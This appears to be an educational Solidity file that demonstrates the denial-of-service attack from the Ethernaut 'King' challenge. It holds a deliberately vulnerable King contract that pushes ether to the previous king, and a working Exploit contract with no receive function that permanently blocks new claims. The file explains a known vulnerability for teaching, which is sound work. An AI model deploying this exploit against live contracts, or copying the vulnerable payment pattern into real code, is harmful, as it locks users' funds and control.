// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/*
The following is a classic example of a Dos attack, inspired by one of the Ethernaut CTF challenges
The attack unfolds as follows:

1. Deploy a malicious contract (Exploit) that becomes king by sending more ether than the current balance.
2. The Exploit contract does not have a fallback() or receive() function to accept ether.
3. When someone else tries to become the new king, the ether transfer to the Exploit contract will fail.
4. Since the transfer fails, the entire transaction is reverted.
5. No one can become king anymore, effectively blocking the contract.

Impact:
- The King contract becomes unusable.
- No new player can become king.
- The attacker maintains control indefinitely.

*/
contract King {
    error King__InsufficientAmount();
    error King__TransferFailed();

    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, King__InsufficientAmount());
        (bool sent, ) = king.call{ value: balance }("");
        require(sent, King__TransferFailed());
        balance = msg.value;
        king = msg.sender;
    }
}

contract Exploit {
    function attack(King _king) public payable {
        _king.claimThrone{ value: msg.value }();
    }

    // no fallback or receive function
}
